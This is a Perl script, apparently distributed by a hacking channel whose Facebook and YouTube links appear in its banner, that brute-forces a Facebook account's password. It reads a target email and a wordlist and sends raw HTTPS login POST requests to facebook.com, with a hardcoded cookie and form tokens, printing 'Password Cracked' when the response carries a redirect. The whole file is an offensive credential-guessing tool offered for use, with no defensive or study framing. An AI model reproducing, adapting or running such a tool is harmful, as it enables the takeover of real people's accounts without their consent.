#!/usr/bin/perl
#

use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print "                               Version 2.32 \n";
print "  LL        II     NNNN   NN    .CCCC.   oooo    NNNN   NN  uu   uu    HH  HH\n";
print "  LL        II     NN NN  NN   CCC  CC  oo  oo   NN NN  NN  uu   uu    HH  HH\n";
print "  LL        II     NN  NN NN   CC       oo  oo   NN  NN NN  uu   uu    HHHHHH\n";
print "  LL        II     NN   NNNN   CC       oo  oo   NN   NNNN  uu   uu    HHHHHH\n";
print "  LL        II     NN    NNN   CCC  CC  oo  oo   NN    NNN  uuuuuuu    HH  HH\n";
print "  LLLLLLL   II     NN     NN    'CCCC    oooo    NN     NN  uuuuuuu    HH  HH\n";

print "\033[1;31m          ======================================================\n";
print "\033[1;37m               Usage: perl $0 mail wordlist.txt\n\n\n\n\n\n\n\n\n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";


print "                               Version 2.32 \n";
print "  LL        II     NNNN   NN    .CCCC.   oooo    NNNN   NN  uu   uu    HH  HH\n";
print "  LL        II     NN NN  NN   CCC  CC  oo  oo   NN NN  NN  uu   uu    HH  HH\n";
print "  LL        II     NN  NN NN   CC       oo  oo   NN  NN NN  uu   uu    HHHHHH\n";
print "  LL        II     NN   NNNN   CC       oo  oo   NN   NNNN  uu   uu    HHHHHH\n";
print "  LL        II     NN    NNN   CCC  CC  oo  oo   NN    NNN  uuuuuuu    HH  HH\n";
print "  LLLLLLL   II     NN     NN    'CCCC    oooo    NN     NN  uuuuuuu    HH  HH\n";


print "\033[1;31m          =======================VISITE FACEBOOK=======================\n";
print "\033[1;33m                  --*https://www.facebook.com/incon.H/*--                 \n";
print "\033[1;31m          =======================VISITE YOUTUBE========================\n";
print "\033[1;33m          -*https://www.youtube.com/channel/UCPYVaNXC5JN-ekEstOilPyw*-                 \n";
print "\033[1;31m          -------------------------------------------------------\n";
 
print "\033[1;39m\n [+] Cracking Started on: $user ...\n\n";
print "=======================================>\n";

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "\033[1;31m[-] $password -> Failed \n";
close SSL;
}
else
{
print "\033[1;32m\n########################################################\n";
print "[+] \033[1;32mPassword Cracked: $password\n";
print "\033[1;32m########################################################\n\n";
close SSL;
exit;
}
}
